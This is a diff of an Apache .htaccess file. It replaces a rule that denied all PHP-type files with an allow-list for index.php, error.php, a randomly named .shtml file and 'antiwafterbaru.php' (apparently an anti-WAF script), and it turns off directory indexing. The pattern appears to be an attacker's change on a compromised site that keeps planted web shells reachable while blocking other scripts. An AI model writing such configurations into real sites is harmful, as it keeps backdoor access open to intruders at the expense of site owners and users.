@@ -1,9 +1,6 @@
-<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT)$">
-Order allow,deny
-Deny from all
-</FilesMatch>
+Options -Indexes
 
-<FilesMatch "^(index.php|error.php|antidel.php)$">
+<FilesMatch "^(index.php|67a3459cc8219.shtml|antiwafterbaru.php|error.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
